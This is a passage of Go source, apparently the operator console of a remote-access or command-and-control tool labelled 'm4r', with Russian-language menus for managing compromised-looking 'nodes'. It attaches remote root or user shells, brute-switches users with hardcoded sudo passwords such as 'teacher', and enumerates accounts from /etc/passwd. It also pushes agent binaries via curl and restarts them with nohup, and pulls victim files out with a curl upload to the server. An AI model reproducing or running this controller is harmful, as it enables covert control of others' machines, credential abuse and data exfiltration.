			}
			label := "-"
			if n.Note != "" {
				label = fmt.Sprintf("\x1b[1;33m%s\x1b[0m", n.Note)
			}
			eng := n.VncEngine
			if eng == "" {
				eng = "custom"
			}
			if n.ActiveVncClients > 0 {
				eng = fmt.Sprintf("%s (%d cl)", eng, n.ActiveVncClients)
			}
			rootBadge := "\x1b[1;31m[ROOT]\x1b[0m"
			if !n.HasRoot {
				rootBadge = "\x1b[33m[USER]\x1b[0m"
			}
			ptyConnect := fmt.Sprintf("%s:%d", vpsIP, 9000+n.Slot)
			vncConnect := fmt.Sprintf("%s:%d [%s]", vpsIP, 5900+n.Slot, eng)
			w.WriteString(fmt.Sprintf("  [%d] %-17s %s %s \x1b[1;36m%-26s\x1b[0m \x1b[1;35m%-30s\x1b[0m %s\r\n",
				n.Slot, n.ID, rootBadge, status, ptyConnect, vncConnect, label))
		}
		w.WriteString("  ----------------------------------------------------------------------------------------------------------\r\n\r\n")
	}

	w.WriteString("  \x1b[1;33mБыстрый доступ:\x1b[0m\r\n")
	w.WriteString(fmt.Sprintf("  - \x1b[1m<номер> [юзер]\x1b[0m (напр. '6 teacher' или '1 root') : Shell (если есть root/sudo — переключает юзера)\r\n"))
	w.WriteString(fmt.Sprintf("  - \x1b[1mnc %s 9001\x1b[0m   : прямое подключение без меню сразу в Shell узла #1\r\n", vpsIP))
	w.WriteString("  - \x1b[1mnote <#> <текст>\x1b[0m       : установить заметку/метку на узел (напр. 'note 1 Склад')\r\n")
	w.WriteString("  - \x1b[1muninstall <#>\x1b[0m          : полное самоудаление агента с узла (стирает бинарники и службы)\r\n")
	w.WriteString("  - \x1b[1mquality <#> <fast|best>\x1b[0m: настройка сжатия и палитры VNC (напр. 'quality 1 fast')\r\n")
	w.WriteString("  - \x1b[1mtab 2 / tab 3 / tab 4\x1b[0m  : переключение на Файлы, VNC или Инструменты\r\n")
	w.WriteString("  - \x1b[1mr\x1b[0m                      : обновить | \x1b[1mq\x1b[0m: выход\r\n\r\n")
	w.WriteString("m4r:nodes> ")
}

func (toc *TCPOperatorConsole) printTabFiles(w *bufio.Writer) {
	toc.printTabFilesNodePicker(w)
}

func (toc *TCPOperatorConsole) printTabVNC(w *bufio.Writer) {
	nodes := toc.nm.ListNodes()
	vpsIP := toc.getPublicIP()

	w.WriteString("  \x1b[1m#   NODE ID           VNC ENGINE   VNC CONNECT (DESKTOP)        RESOLUTION       SCALE / PALETTE        CLIENTS   STATUS\x1b[0m\r\n")
	w.WriteString("  ---------------------------------------------------------------------------------------------------------------------------------\r\n")
	if len(nodes) == 0 {
		w.WriteString("  (нет активных узлов)\r\n")
	} else {
		for _, n := range nodes {
			n.mu.RLock()
			engine := n.VncEngine
			if engine == "" {
				engine = "custom"
			}
			res := "--"
			if n.VncWidth > 0 && n.VncHeight > 0 {
				if n.VncWidth > 1920 || n.VncHeight > 1080 {
					res = fmt.Sprintf("%dx%d->HD", n.VncWidth, n.VncHeight)
				} else {
					res = fmt.Sprintf("%dx%d", n.VncWidth, n.VncHeight)
				}
			}
			clients := fmt.Sprintf("%d active", n.ActiveVncClients)
			if n.ActiveVncClients > 0 {
				clients = fmt.Sprintf("\x1b[1;32m%d active\x1b[0m", n.ActiveVncClients)
			}
			status := "\x1b[32mREADY\x1b[0m"
			if time.Since(n.LastSeen) > 15*time.Second {
				status = "\x1b[31mOFFLINE\x1b[0m"
			}
			slot := n.Slot
			id := n.ID
			scale := n.VncScale
			bpp := n.VncTargetBpp
			if bpp == 0 {
				bpp = 16
			}
			n.mu.RUnlock()

			scaleStr := "auto"
			if scale == 1 {
				scaleStr = "1x (native)"
			} else if scale > 1 {
				scaleStr = fmt.Sprintf("%dx", scale)
			}
			bppStr := fmt.Sprintf("%dbpp", bpp)
			if bpp == 8 {
				bppStr = "\x1b[1;33m8bpp (256-col)\x1b[0m"
			} else if bpp == 16 {
				bppStr = "\x1b[1;36m16bpp (RGB565)\x1b[0m"
			} else if bpp == 32 {
				bppStr = "\x1b[1;32m32bpp (True)\x1b[0m"
			}
			qualityStr := fmt.Sprintf("%s / %s", scaleStr, bppStr)

			vncConnect := fmt.Sprintf("%s:%d", vpsIP, 5900+slot)
			w.WriteString(fmt.Sprintf("  [%d] %-17s %-12s \x1b[1;35m%-28s\x1b[0m %-16s %-32s %-9s %s\r\n",
				slot, id, engine, vncConnect, res, qualityStr, clients, status))
		}
	}
	w.WriteString("  ---------------------------------------------------------------------------------------------------------------------------------\r\n\r\n")
	w.WriteString("  \x1b[1;33mБыстрые настройки качества и палитры:\x1b[0m\r\n")
	w.WriteString("  - \x1b[1mscale <#> <1|2|3|4|auto>\x1b[0m         : степень сжатия разрешения (1x=исходное, 2x=HD/половина, 4x=макс. сжатие)\r\n")
	w.WriteString("  - \x1b[1mbpp <#> <8|16|32>\x1b[0m                : передача цветов (8=палитра 256 цв./сжатие 4x, 16=RGB565, 32=TrueColor)\r\n")
	w.WriteString("  - \x1b[1mquality <#> <fast|balanced|best>\x1b[0m : готовые профили качества (напр. 'quality 1 fast')\r\n")
	w.WriteString("  - \x1b[1mquality <#> <scale> <bpp>\x1b[0m        : точная настройка (напр. 'quality 1 2 8' -> 2x сжатие, 8 бит палитра)\r\n\r\n")
	w.WriteString("  \x1b[1;33mУправление графическими движками:\x1b[0m\r\n")
	w.WriteString("  - \x1b[1mkrfb <#>\x1b[0m                         : автоустановка и бесшовный запуск KRFB Plasma Desktop\r\n")
	w.WriteString("  - \x1b[1mengine <#> <custom|krfb|x11vnc>\x1b[0m  : включить встроенный C-движок или системный сервер\r\n")
	w.WriteString("  - \x1b[1mport <#> <порт>\x1b[0m                  : переопределить порт VNC\r\n\r\n")
	w.WriteString("m4r:vnc> ")
}

func (toc *TCPOperatorConsole) printTabTools(w *bufio.Writer) {
	w.WriteString("  \x1b[1mИНСТРУМЕНТЫ, АВТООБНОВЛЕНИЕ И RESCUE:\x1b[0m\r\n")
	w.WriteString("  ------------------------------------------------------------------------------\r\n")
	w.WriteString("  - \x1b[1;32mupdate-all\x1b[0m            : МАССОВОЕ обновление всех подключенных узлов со старой версией\r\n")
	w.WriteString("  - \x1b[1;32mupdate <#>\x1b[0m            : обновить бинарник агента на конкретном узле\r\n")
	w.WriteString("  - \x1b[1;31muninstall <#>\x1b[0m         : полное самоудаление агента с узла (стирает автозагрузку, службы и бинарники)\r\n")
	w.WriteString("  - \x1b[1mexec <#> <команда>\x1b[0m    : выполнить команду в изолированном процессе (напр. 'exec 1 uptime')\r\n")
	w.WriteString("  - \x1b[1ml / rescue\x1b[0m            : руководство по аварийному доступу и миграции VPS\r\n")
	w.WriteString("  - \x1b[1mdebug <#>\x1b[0m             : просмотр логов и телеметрии узла\r\n")
	w.WriteString("  ------------------------------------------------------------------------------\r\n\r\n")
	w.WriteString("m4r:tools> ")
}

// selectTargetUser checks for root or sudo privileges and interactively prompts for the target login user
func (toc *TCPOperatorConsole) selectTargetUser(writer *bufio.Writer, reader *bufio.Reader, target *Node) string {
	timeout := time.Duration(toc.cfg.NodeOnlineTimeoutSec) * time.Second
	if time.Since(target.LastSeen) > timeout {
		return ""
	}

	target.mu.RLock()
	hasRoot := target.HasRoot
	target.mu.RUnlock()

	// Non-root node: skip all synchronous probe commands and return immediately!
	if !hasRoot {
		return ""
	}

	usersRaw := toc.executeCommandSync(target, `awk -F: '($3 >= 500 || $3 == 0) && $7 !~ /(nologin|false|sync|halt|shutdown)/ && $1 !~ /(nobody|systemd)/ {print $1}' /etc/passwd 2>/dev/null`, 800*time.Millisecond)
	lines := strings.Split(usersRaw, "\n")
	var normalUsers []string
	seen := make(map[string]bool)

	for _, l := range lines {
		u := strings.TrimSpace(l)
		if u == "" || seen[u] {
			continue
		}
		seen[u] = true
		if u == "root" {
			continue
		}
		normalUsers = append(normalUsers, u)
	}

	var finalUsers []string
	finalUsers = append(finalUsers, "root")
	finalUsers = append(finalUsers, normalUsers...)

	if len(finalUsers) <= 1 {
		return "root"
	}

	writer.WriteString("\r\n\x1b[1;36m+------------------------------------------------------------------------+\r\n")
	writer.WriteString(fmt.Sprintf("| ВЫБОР ПОЛЬЗОВАТЕЛЯ ДЛЯ ТЕРМИНАЛА // [%-15s]                    |\r\n", target.ID))
	writer.WriteString("+------------------------------------------------------------------------+\x1b[0m\r\n")
	for i, u := range finalUsers {
		desc := "пользователь системы"
		if u == "root" {
			desc = "суперпользователь (полный root доступ)"
		}
		writer.WriteString(fmt.Sprintf("  [%d] \x1b[1m%-16s\x1b[0m (%s)\r\n", i+1, u, desc))
	}
	writer.WriteString("------------------------------------------------------------------------\r\n")
	defaultUser := finalUsers[0]
	writer.WriteString(fmt.Sprintf("Выберите номер [1-%d] (Enter по умолчанию [%s], 'c' отмена): ", len(finalUsers), defaultUser))
	writer.Flush()

	line, err := reader.ReadString('\n')
	if err != nil {
		return defaultUser
	}
	choice := strings.TrimSpace(line)
	if choice == "c" || choice == "cancel" || choice == "back" || choice == "q" {
		return "CANCEL"
	}
	if choice == "" {
		return defaultUser
	}
	if idx, err := strconv.Atoi(choice); err == nil && idx >= 1 && idx <= len(finalUsers) {
		return finalUsers[idx-1]
	}
	for _, u := range finalUsers {
		if strings.EqualFold(u, choice) {
			return u
		}
	}
	return defaultUser
}

func (toc *TCPOperatorConsole) attachTerminal(conn net.Conn, reader *bufio.Reader, writer *bufio.Writer, target *Node, targetUser string) {
	asUserMsg := ""
	if targetUser != "" {
		asUserMsg = fmt.Sprintf(" as user '%s'", targetUser)
	}
	writer.WriteString(fmt.Sprintf("\r\n\x1b[1;32m[+] Attaching to [%s] (%s)%s. Press Ctrl+] to detach...\x1b[0m\r\n\r\n", target.ID, target.Hostname, asUserMsg))
	writer.Flush()

	sessID, err := toc.udpGw.SendSessionOpen(target, target.Cols, target.Rows)
	if err != nil {
		writer.WriteString(fmt.Sprintf("[-] Failed to open session: %v\r\n", err))
		writer.Flush()
		return
	}
	defer func() {
		_ = toc.udpGw.SendSessionCloseID(target, sessID)
	}()

	subID := fmt.Sprintf("tui-%d", sessID)
	ptyCh := target.AddPTYSubscriberForSession(subID, sessID)
	defer target.RemovePTYSubscriber(subID)

	// Redundant resize packet ensures UDP delivery & triggers redraw
	_ = toc.udpGw.SendPtyResizeID(target, sessID, target.Cols, target.Rows)

	target.AddLog(fmt.Sprintf("Operator attached via netcat (Session ID %d)%s", sessID, asUserMsg))

	if targetUser != "" {
		switchCmd := fmt.Sprintf("if [ \"$(id -u 2>/dev/null)\" -eq 0 ]; then exec su - %s; elif sudo -n true 2>/dev/null; then exec sudo -u %s -i; elif echo '' | sudo -S true 2>/dev/null; then (echo '' | sudo -S -u %s -i) || (echo '' | sudo -S su - %s); elif echo 'teacher' | sudo -S true 2>/dev/null; then (echo 'teacher' | sudo -S -u %s -i) || (echo 'teacher' | sudo -S su - %s); else exec su - %s; fi\r\n", targetUser, targetUser, targetUser, targetUser, targetUser, targetUser, targetUser)
		_ = toc.udpGw.SendPtyDataWithSession(target, sessID, []byte(switchCmd))
	} else {
		// Send an immediate Enter so the shell displays prompt right away
		_ = toc.udpGw.SendPtyDataWithSession(target, sessID, []byte("\r"))
	}

	stopCh := make(chan struct{})
	doneReading := make(chan struct{})

	// Goroutine: forward PTY output from agent to netcat connection
	go func() {
		defer close(doneReading)
		for {
			select {
			case <-stopCh:
				return
			case data, ok := <-ptyCh:
				if !ok {
					return
				}
				_, err := conn.Write(data)
				if err != nil {
					return
				}
				if strings.Contains(string(data), "Remote session terminated by agent") {
					return
				}
			}
		}
	}()

	// Unblock reader when remote session closes
	go func() {
		select {
		case <-doneReading:
			_ = conn.SetReadDeadline(time.Now())
		case <-stopCh:
		}
	}()

	// Loop: read raw keystrokes from netcat and forward to agent
	buf := make([]byte, 512)
	var recentLine strings.Builder

	for {
		n, err := reader.Read(buf)
		if err != nil {
			break
		}

		// Escape sequence Ctrl+] (0x1D) to detach cleanly
		if n == 1 && buf[0] == 0x1D {
			writer.WriteString("\r\n\x1b[33m[*] Operator detached.\x1b[0m\r\n")
			writer.Flush()
			break
		}

		// Direct line check for exit
		cmdStr := strings.TrimSpace(string(buf[:n]))
		if cmdStr == "exit" || cmdStr == "quit" {
			_ = toc.udpGw.SendPtyDataWithSession(target, sessID, []byte("exit\r\n"))
			writer.WriteString("\r\n\x1b[33m[*] Exiting session and returning to menu...\x1b[0m\r\n")
			writer.Flush()
			break
		}

		// Character-by-character check for exit
		detached := false
		for _, b := range buf[:n] {
			if b == '\r' || b == '\n' {
				line := strings.TrimSpace(recentLine.String())
				if line == "exit" || line == "quit" {
					_ = toc.udpGw.SendPtyDataWithSession(target, sessID, []byte("exit\r\n"))
					writer.WriteString("\r\n\x1b[33m[*] Exiting session and returning to menu...\x1b[0m\r\n")
					writer.Flush()
					detached = true
					break
				}
				recentLine.Reset()
			} else if b == 0x7f || b == 0x08 { // Backspace handling
				s := recentLine.String()
				if len(s) > 0 {
					recentLine.Reset()
					recentLine.WriteString(s[:len(s)-1])
				}
			} else if b >= 32 && b <= 126 {
				recentLine.WriteByte(b)
			}
		}

		if detached {
			break
		}

		_ = toc.udpGw.SendPtyDataWithSession(target, sessID, buf[:n])
	}

	_ = conn.SetReadDeadline(time.Time{})
	_ = toc.udpGw.SendSessionCloseID(target, sessID)
	close(stopCh)
	time.Sleep(100 * time.Millisecond)
}

func (toc *TCPOperatorConsole) printDebug(w *bufio.Writer, n *Node) {
	w.WriteString(fmt.Sprintf("\r\n\x1b[1;36m[DEBUG INFO FOR NODE: %s]\x1b[0m\r\n", n.ID))
	w.WriteString(fmt.Sprintf(" Hostname:   %s\r\n", n.Hostname))
	w.WriteString(fmt.Sprintf(" OS Info:    %s\r\n", n.OSInfo))
	w.WriteString(fmt.Sprintf(" Address:    %s\r\n", n.RemoteAddr))
	w.WriteString(fmt.Sprintf(" Last Seen:  %s (%ds ago)\r\n", n.LastSeen.Format("15:04:05"), int(time.Since(n.LastSeen).Seconds())))
	w.WriteString(fmt.Sprintf(" Note:       %s\r\n", n.Note))
	w.WriteString(fmt.Sprintf(" VNC Engine: %s (Active: %v, %dx%d)\r\n", n.VncEngine, n.VncActive, n.VncWidth, n.VncHeight))
	w.WriteString("\r\n \x1b[1mEvent & Error Logs:\x1b[0m\r\n")
	if len(n.DebugLogs) == 0 {
		w.WriteString("   (no logs recorded)\r\n")
	} else {
		for _, l := range n.DebugLogs {
			w.WriteString(fmt.Sprintf("   %s\r\n", l))
		}
	}
	w.WriteString("\r\nPress Enter to continue...")
	_ = w.Flush()
}

func (toc *TCPOperatorConsole) printVncInfo(w *bufio.Writer, n *Node) {
	w.WriteString(fmt.Sprintf("\r\n\x1b[1;36m[VNC DESKTOP ACCESS: %s]\x1b[0m\r\n", n.ID))
	w.WriteString(fmt.Sprintf(" Engine:     %s\r\n", n.VncEngine))
	w.WriteString(fmt.Sprintf(" Resolution: %dx%d (%d bpp)\r\n", n.VncWidth, n.VncHeight, n.VncBpp))
	w.WriteString(fmt.Sprintf(" Web Viewer: http://<SERVER_IP>:8080 (Desktop View)\r\n"))
	w.WriteString(" Stream connects automatically via TCP 443 with Pixel-RLE compression.\r\n")
	w.WriteString("\r\nPress Enter to continue...")
	_ = w.Flush()
}

func (toc *TCPOperatorConsole) triggerUpdate(w *bufio.Writer, n *Node, conn net.Conn) {
	w.WriteString(fmt.Sprintf("[*] Dispatching binary update to [%s] ...\r\n", n.ID))
	w.Flush()

	serverHost := "127.0.0.1"
	if tcpAddr, ok := conn.LocalAddr().(*net.TCPAddr); ok && !tcpAddr.IP.IsUnspecified() {
		serverHost = tcpAddr.IP.String()
	}

	httpPort := "8080"
	if parts := strings.Split(toc.cfg.HTTPAddr, ":"); len(parts) >= 2 {
		httpPort = parts[len(parts)-1]
	}

	updateCmd := fmt.Sprintf(
		"curl -fsSL http://%s:%s/bin/agent -o /tmp/m4r_upd 2>/dev/null || curl -fsSL http://127.0.0.1:%s/bin/agent -o /tmp/m4r_upd; "+
			"chmod +x /tmp/m4r_upd && (mv -f /tmp/m4r_upd /usr/local/bin/mar4uder_agent 2>/dev/null || mv -f /tmp/m4r_upd ~/.local/bin/mar4uder_agent); "+
			"rm -f /tmp/m4r_upd; (systemctl restart mar4uder-agent 2>/dev/null || pkill -9 -f mar4uder_agent && nohup mar4uder_agent %s:443 %s >/dev/null 2>&1 &)\n",
		serverHost, httpPort, httpPort, serverHost, n.Hostname)

	_ = toc.udpGw.SendPtyData(n, []byte(updateCmd))
	n.AddLog("Binary update triggered remotely from operator console")
	w.WriteString("\x1b[32m[+] Update payload dispatched via PTY stream.\x1b[0m\r\n")
	w.Flush()
}

func (toc *TCPOperatorConsole) executeNodeCommand(target *Node, cmd string, timeout time.Duration) (string, error) {
	sessID, err := toc.udpGw.SendSessionOpen(target, 120, 35)
	if err != nil {
		return "", err
	}
	defer func() {
		_ = toc.udpGw.SendSessionCloseID(target, sessID)
	}()

	subID := fmt.Sprintf("tui-cmd-%d", sessID)
	ptyCh := target.AddPTYSubscriberForSession(subID, sessID)
	defer target.RemovePTYSubscriber(subID)

	nonce := fmt.Sprintf("%d", time.Now().UnixNano()%1000000)
	startMarker := fmt.Sprintf("___M4R_START_%s___", nonce)
	endMarker := fmt.Sprintf("___M4R_END_%s___", nonce)

	time.Sleep(50 * time.Millisecond)
	wrappedCmd := fmt.Sprintf("echo '%s'\n%s\necho '%s'\n", startMarker, cmd, endMarker)
	_ = toc.udpGw.SendPtyDataWithSession(target, sessID, []byte(wrappedCmd))

	var raw strings.Builder
	timer := time.NewTimer(timeout)
	defer timer.Stop()

	for {
		select {
		case <-timer.C:
			cur := raw.String()
			parts := strings.Split(cur, startMarker)
			if len(parts) >= 2 {
				return cleanPtyOutput(parts[len(parts)-1]), nil
			}
			return cleanPtyOutput(cur), nil
		case chunk, ok := <-ptyCh:
			if !ok {
				cur := raw.String()
				parts := strings.Split(cur, startMarker)
				if len(parts) >= 2 {
					return cleanPtyOutput(parts[len(parts)-1]), nil
				}
				return cleanPtyOutput(cur), nil
			}
			raw.Write(chunk)
			cur := raw.String()
			parts := strings.Split(cur, startMarker)
			if len(parts) >= 2 {
				afterStart := parts[len(parts)-1]
				if strings.Contains(afterStart, endMarker) {
					endParts := strings.Split(afterStart, endMarker)
					return cleanPtyOutput(endParts[0]), nil
				}
			}
		}
	}
}

func (toc *TCPOperatorConsole) detectInitialPath(target *Node) string {
	timeout := time.Duration(toc.cfg.NodeOnlineTimeoutSec) * time.Second
	if time.Since(target.LastSeen) > timeout {
		return "/"
	}
	out := toc.executeCommandSync(target, `if [ "$(id -u 2>/dev/null)" = "0" ]; then echo "/"; elif [ -n "$HOME" ]; then echo "$HOME"; else pwd; fi`, 1500*time.Millisecond)
	lines := strings.Split(strings.TrimSpace(out), "\n")
	for _, l := range lines {
		l = strings.TrimSpace(l)
		if strings.HasPrefix(l, "/") {
			return l
		}
	}
	return "/"
}

func (toc *TCPOperatorConsole) executeCommandSync(target *Node, cmd string, timeout time.Duration) string {
	reqID := uint32(time.Now().UnixNano() & 0x7FFFFFFF)
	ch := target.AddCmdWaiter(reqID)
	defer target.RemoveCmdWaiter(reqID)

	timeoutSec := uint32(timeout.Seconds() + 1)
	if timeoutSec < 2 {
		timeoutSec = 2
	}

	if err := toc.udpGw.SendCmdExec(target, reqID, timeoutSec, cmd); err == nil {
		var buf strings.Builder
		timer := time.NewTimer(timeout)
		defer timer.Stop()

	cmdLoop:
		for {
			select {
			case <-timer.C:
				break cmdLoop
			case out, ok := <-ch:
				if !ok {
					break cmdLoop
				}
				if out.Len > 0 {
					buf.Write(out.Data[:out.Len])
				}
				if out.ExitCode >= 0 {
					break cmdLoop
				}
			}
		}
		res := strings.TrimSpace(buf.String())
		if res != "" {
			return res
		}
	}

	// Fallback to PTY command if CmdExec didn't respond
	out, _ := toc.executeNodeCommand(target, cmd, timeout)
	return strings.TrimSpace(out)
}

func (toc *TCPOperatorConsole) fetchDirectoryEntries(target *Node, dirPath string) []FileBrowseItem {
	if dirPath == "" || dirPath == "." {
		dirPath = "/"
	}
	cleanPath := path.Clean(dirPath)
	if !strings.HasPrefix(cleanPath, "/") {
		cleanPath = "/" + cleanPath
	}

	rawEntries := make(map[string]FileBrowseItem)

	timeout := time.Duration(toc.cfg.NodeOnlineTimeoutSec) * time.Second
	isOnline := time.Since(target.LastSeen) <= timeout

	// 1. Try Native Direct Binary RPC via MSG_FS_LIST_REQ
	if isOnline {
		reqID := uint32(time.Now().UnixNano() & 0x7FFFFFFF)
		ch := target.AddFsListWaiter(reqID)
		defer target.RemoveFsListWaiter(reqID)

		if err := toc.udpGw.SendFsListReq(target, reqID, cleanPath); err == nil {
			timer := time.NewTimer(1500 * time.Millisecond)
			defer timer.Stop()

		waitLoop:
			for {
				select {
				case <-timer.C:
					break waitLoop
				case batch, ok := <-ch:
					if !ok {
						break waitLoop
					}
					for _, fe := range batch {
						name := CStringToString(fe.Name[:])
						if name == "" || name == "." {
							continue
						}
						isDir := fe.IsDir == 1
						perm := "-rw-r--r--"
						if isDir {
							perm = "drwxr-xr-x"
						}
						fullP := path.Join(cleanPath, name)
						rawEntries[name] = FileBrowseItem{
							Name:     name,
							IsDir:    isDir,
							Size:     int64(fe.Size),
							FullPath: fullP,
							Perm:     perm,
						}
					}
					if len(batch) < 4 {
						break waitLoop
					}
				}
			}
		}
	}

	// 2. Fallback to ls -lap command if native RPC returned nothing and node is online
	if len(rawEntries) == 0 && isOnline {
		cmd := fmt.Sprintf("LC_ALL=C ls -lap '%s' 2>/dev/null", cleanPath)
		out := toc.executeCommandSync(target, cmd, 2*time.Second)
		if out != "" {
			lines := strings.Split(out, "\n")
			for _, l := range lines {
				line := strings.TrimSpace(l)
				if line == "" || strings.HasPrefix(line, "total ") {
					continue
				}
				fields := strings.Fields(line)
				if len(fields) < 9 {
					continue
				}
				perm := fields[0]
				isDir := strings.HasPrefix(perm, "d")
				var size int64
				if s, err := strconv.ParseInt(fields[4], 10, 64); err == nil {
					size = s
				}
				name := strings.Join(fields[8:], " ")
				name = strings.TrimSuffix(name, "/")
				if name == "" || name == "." {
					continue
				}
				fullP := path.Join(cleanPath, name)
				rawEntries[name] = FileBrowseItem{
					Name:     name,
					IsDir:    isDir,
					Size:     size,
					FullPath: fullP,
					Perm:     perm,
				}
			}
		}
	}

	var dirs []FileBrowseItem
	var files []FileBrowseItem

	for _, it := range rawEntries {
		if it.Name == ".." {
			continue
		}
		if it.IsDir {
			dirs = append(dirs, it)
		} else {
			files = append(files, it)
		}
	}

	sort.Slice(dirs, func(i, j int) bool {
		return strings.ToLower(dirs[i].Name) < strings.ToLower(dirs[j].Name)
	})
	sort.Slice(files, func(i, j int) bool {
		return strings.ToLower(files[i].Name) < strings.ToLower(files[j].Name)
	})

	var result []FileBrowseItem
	if cleanPath != "/" {
		parent := path.Dir(strings.TrimSuffix(cleanPath, "/"))
		if parent == "" {
			parent = "/"
		}
		result = append(result, FileBrowseItem{
			Name:     "..",
			IsDir:    true,
			Size:     0,
			FullPath: parent,
			Perm:     "drwxr-xr-x",
		})
	}

	for _, d := range dirs {
		result = append(result, d)
	}
	for _, f := range files {
		result = append(result, f)
	}

	for i := range result {
		result[i].Index = i + 1
	}

	return result
}

func (toc *TCPOperatorConsole) printTabFilesNodePicker(w *bufio.Writer) {
	timeout := time.Duration(toc.cfg.NodeOnlineTimeoutSec) * time.Second
	nodes := toc.nm.ListSummaries(timeout)

	w.WriteString("  \x1b[1mВЫБОР КОМПЬЮТЕРА ДЛЯ ОБЗОРА ФАЙЛОВ:\x1b[0m\r\n")
	w.WriteString("  --------------------------------------------------------------------------------------------------\r\n")
	if len(nodes) == 0 {
		w.WriteString("  \x1b[33mНет доступных узлов.\x1b[0m\r\n")
	} else {
		w.WriteString("  \x1b[1m#   УЗЕЛ (ID)         ПРАВА   СТАТУС      ХОСТ / СИСТЕМА                 МЕТКА\x1b[0m\r\n")
		w.WriteString("  ----------------------------------------------------------------------------------------------------------\r\n")
		for _, n := range nodes {
			status := "\x1b[1;32mONLINE \x1b[0m"
			if !n.IsOnline {
				status = "\x1b[31mOFFLINE\x1b[0m"
			}
			label := "-"
			if n.Note != "" {
				label = fmt.Sprintf("\x1b[1;33m%s\x1b[0m", n.Note)
			}
			hostInfo := n.Hostname
			if n.OSInfo != "" {
				hostInfo = fmt.Sprintf("%s (%s)", n.Hostname, n.OSInfo)
			}
			rootBadge := "\x1b[1;31m[ROOT]\x1b[0m"
			if !n.HasRoot {
				rootBadge = "\x1b[33m[USER]\x1b[0m"
			}
			w.WriteString(fmt.Sprintf("  [%d] %-17s %s %s \x1b[1;36m%-30s\x1b[0m %s\r\n",
				n.Slot, n.ID, rootBadge, status, hostInfo, label))
		}
	}
	w.WriteString("  ----------------------------------------------------------------------------------------------------------\r\n\r\n")
	w.WriteString("  \x1b[1;33mБыстрый доступ:\x1b[0m\r\n")
	w.WriteString("  - \x1b[1m<номер>\x1b[0m (напр. '1')  : выбрать компьютер и открыть его файловую систему\r\n")
	w.WriteString("  - \x1b[1mtab 1 / tab 3\x1b[0m        : перейти к консоли узлов или VNC\r\n")
	w.WriteString("  - \x1b[1mr\x1b[0m                    : обновить список | \x1b[1mq\x1b[0m: выход\r\n\r\n")
	w.WriteString("m4r:files> ")
	_ = w.Flush()
}

func (toc *TCPOperatorConsole) printTabFilesDirView(w *bufio.Writer, target *Node, currentPath string, entries []FileBrowseItem) {
	w.WriteString(fmt.Sprintf("\r\n\x1b[1;36m+------------------------------------------------------------------------+\r\n"))
	w.WriteString(fmt.Sprintf("| REMOTE FILE EXPLORER // %-46s |\r\n", fmt.Sprintf("[%s] %s", target.ID, currentPath)))
	w.WriteString("+------------------------------------------------------------------------+\x1b[0m\r\n")

	if len(entries) == 0 {
		w.WriteString("  \x1b[33m(директория пуста или узел оффлайн)\x1b[0m\r\n")
	} else {
		for _, it := range entries {
			tag := "\x1b[32m[FILE]\x1b[0m"
			if it.IsDir {
				tag = "\x1b[1;34m[DIR] \x1b[0m"
			}
			sizeStr := ""
			if !it.IsDir {
				sizeStr = fmt.Sprintf("(%d байт)", it.Size)
			}
			w.WriteString(fmt.Sprintf("  [%2d] %s %-32s %s\r\n", it.Index, tag, it.Name, sizeStr))
		}
	}

	w.WriteString("------------------------------------------------------------------------\r\n")
	w.WriteString("  \x1b[1;33mКоманды управления:\x1b[0m\r\n")
	w.WriteString("  - \x1b[1m<номер>\x1b[0m         : провалиться в директорию (напр. '2' или '1' для '..')\r\n")
	w.WriteString("  - \x1b[1mpull <номер>\x1b[0m    : скачать файл/папку на сервер/ПК (напр. 'pull 4')\r\n")
	w.WriteString("  - \x1b[1mpush <путь_пк>\x1b[0m  : закинуть файл с ПК в текущий каталог (напр. 'push test.sh')\r\n")
	w.WriteString("  - \x1b[1mcd <путь>\x1b[0m       : перейти в каталог по пути (напр. 'cd /etc')\r\n")
	w.WriteString("  - \x1b[1m..\x1b[0m              : подняться на уровень выше\r\n")
	w.WriteString("  - \x1b[1mback / nodes\x1b[0m    : вернуться к выбору другого компьютера\r\n")
	w.WriteString("  - \x1b[1mr\x1b[0m               : обновить содержимое каталога\r\n")
	w.WriteString("------------------------------------------------------------------------\r\n")
	w.WriteString(fmt.Sprintf("m4r:files(%s)> ", currentPath))
	_ = w.Flush()
}

func (toc *TCPOperatorConsole) downloadFileInteractive(w *bufio.Writer, target *Node, remotePath string, conn net.Conn) {
	w.WriteString(fmt.Sprintf("\r\n\x1b[1;36m[*] Скачивание '%s' с узла [%s]...\x1b[0m\r\n", remotePath, target.ID))
	w.Flush()

	serverHost := toc.getClientHost(conn)
	httpPort := "8080"
	if parts := strings.Split(toc.cfg.HTTPAddr, ":"); len(parts) >= 2 {
		httpPort = parts[len(parts)-1]
	}

	filename := filepath.Base(remotePath)
	transferID := uint32(time.Now().UnixNano() & 0x7FFFFFFF)
	pullWait := target.AddFilePullWaiter(transferID)
	defer target.RemoveFilePullWaiter(transferID)

	var fileBuf bytes.Buffer
	downloadSuccess := false

	// Attempt 1: Direct UDP binary pull
	if err := toc.udpGw.SendFilePullReq(target, transferID, remotePath); err == nil {
		timer := time.NewTimer(4 * time.Second)
		defer timer.Stop()

	pullLoop:
		for {
			select {
			case <-timer.C:
				break pullLoop
			case chunk, ok := <-pullWait:
				if !ok || chunk.Len == 0 {
					break pullLoop
				}
				fileBuf.Write(chunk.Data[:chunk.Len])
			}
		}
		if fileBuf.Len() > 0 {
			downloadSuccess = true
		}
	}

	// Attempt 2: Fallback via HTTP curl upload to server
	if !downloadSuccess {
		pushCmd := fmt.Sprintf("curl -fsSL -F 'file=@%s' 'http://%s:%s/api/v1/nodes/receive_file?node_id=%s' 2>/dev/null || curl -fsSL -F 'file=@%s' 'http://127.0.0.1:%s/api/v1/nodes/receive_file?node_id=%s' 2>/dev/null\n",
			remotePath, serverHost, httpPort, target.ID, remotePath, httpPort, target.ID)
		_ = toc.udpGw.SendPtyData(target, []byte(pushCmd))
		w.WriteString(fmt.Sprintf("\x1b[32m[+] Запрос на передачу файла отправлен узлу. Он появится в хранилище через несколько секунд.\x1b[0m\r\n"))
		w.WriteString(fmt.Sprintf("    Просмотр: введите 'files' или откройте http://%s:%s/api/v1/files\r\n\r\n", serverHost, httpPort))
		w.Flush()
		return
	}

	sf, err := toc.fileMgr.SaveFile(filename, &fileBuf, target.ID, "operator")
	if err != nil {
		w.WriteString(fmt.Sprintf("\x1b[31m[-] Ошибка сохранения файла: %v\x1b[0m\r\n", err))
		w.Flush()
		return
	}

	w.WriteString(fmt.Sprintf("\x1b[1;32m[+] Файл успешно скачан и сохранён!\x1b[0m\r\n"))
	w.WriteString(fmt.Sprintf("    Имя: %s | Размер: %d байт | ID: %s\r\n", sf.Filename, sf.Size, sf.ID))
